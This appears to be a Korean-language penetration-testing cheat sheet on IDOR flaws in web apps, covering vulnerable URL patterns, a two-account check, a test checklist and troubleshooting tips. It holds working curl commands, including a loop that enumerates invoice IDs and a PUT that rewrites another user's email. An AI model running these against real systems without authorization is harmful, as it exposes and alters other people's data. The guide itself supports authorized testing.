# IDOR — 안전하지 않은 직접 객체 참조

- IDOR(Insecure Direct Object Reference) — URL·파라미터·쿠키의 ID 값이 서버 측 소유권 검사 없이 객체를 직접 가리켜, 다른 사용자의 데이터를 읽거나 수정할 수 있는 취약점.
- 로그인 후 인증된 상태에서 /profile?id=1 같은 객체 참조를 발견했을 때, 권한 검증이 어플리케이션 로직에 없는지를 1→2로 바꿔보는 테스트를 하는 경우.
- 두 개 이상의 유효한 계정(A와 B)이 있으면 가장 확실하게 검증할 수 있다. 계정이 하나면 ID 범위를 조금씩 바꿔보는 수동 탐색으로 진행한다.

## 취약한 패턴

```text
http://target.com/profile?id=1          사용자 ID가 노출
http://target.com/invoice/1042          문서 번호가 노출
http://target.com/api/users/33          REST API 경로의 객체 ID
Cookie: user_id=5                       쿠키의 객체 참조
POST body: account=88123                폼 데이터의 참조
```

- 객체 참조 값이 연속 숫자·추측 가능한 형태일수록 성공 확률이 높다. UUID 같은 비가역 식별자는 대입이 어렵지만 세션이나 API 응답에 다른 객체의 UUID가 새어 나오면 성립한다.

## 기본 테스트

```bash
# 1) 내 객체 확인
curl -b "session=내세션" http://target.com/profile?id=1

# 2) ID를 1씩 바꿔 다른 사용자 데이터가 나오는지 확인
curl -b "session=내세션" http://target.com/profile?id=2
curl -b "session=내세션" http://target.com/profile?id=3
```

- 성공 판정: 내 계정이 아닌 다른 사용자의 정보(이름·이메일·주문 내역)가 응답에 나온다. 403·404가 나오면 검증이 존재하는 것이다.

## 두 계정으로 확정 검증

```text
1. A 계정으로 로그인해 세션 확보
2. A의 세션으로 B 계정의 객체 ID(예: /invoice/9871)를 요청
3. B의 청구서·프로필이 열리면 IDOR 확정
4. GET만 아니라 PUT/POST/DELETE도 같은 방식으로 시험 (수정·삭제 권한)
```

- 읽기(GET)만 아니라 쓰기(PUT·POST)·삭제(DELETE)까지 열리면 영향도가 크게 다르다. 둘 다 기록한다.

## ID 값 확보 경로

```bash
# 1) API 응답에서 다른 사용자 ID가 새어 나오는지 확인
curl -b "session=..." http://target.com/api/orders | jq

# 2) 연속 숫자 대입 (curl 루프로 범위 테스트)
for i in $(seq 1000 1050); do
  curl -s -o /dev/null -w "%{http_code} $i\n" -b "session=..." http://target.com/invoice/$i
done
```

- 200 응답만 나온 ID가 취약 후보다. 범위 전체를 밀기 전에 소수의 ID로 소유권 검증부터 마친다.

## HTTP 메서드 변형

```bash
# 읽기 외에 수정 시도 (수정 가능한 IDOR)
curl -X PUT -b "session=..." -H "Content-Type: application/json" -d '{"email":"attacker@example.com"}' http://target.com/api/users/2
```

## 점검 체크리스트

```text
- URL·파라미터의 숫자 ID를 바꿔도 권한 검증이 있는가
- 응답에 다른 사용자 데이터가 포함되는가 (과도한 데이터 노출 포함)
- POST/PUT 본문의 객체 참조를 바꾸면 수정·삭제가 되는가
- UUID가 응답·로그·이전 링크로 유출되는가
- 관리자 전용 기능에 일반 사용자의 ID가 통하는가
```

## 트러블슈팅

- ID를 바꿨는데 계속 내 데이터가 나오면 서버가 세션의 사용자 기준으로 응답하는 것이다. 이 경우 취약하지 않은 구현이고, 다른 엔드포인트(API, 모바일 전용 경로)를 시험한다.
- 403이 나오면 IDOR는 아니지만 접근 제어가 있다는 신호다. 다른 HTTP 메서드나 파라미터(POST body로 옮겨진 ID)를 시험한다.
- 대량 요청이 잠긴 후면 WAF·레이트리미트다. ID 대입은 소수의 수동 요청으로 확정하고, 자동화는 최소화한다.
- 실습 사례는 web/README.md 인덱스와 web/burp(burp로 요청 조작) 문서를 함께 참고한다.
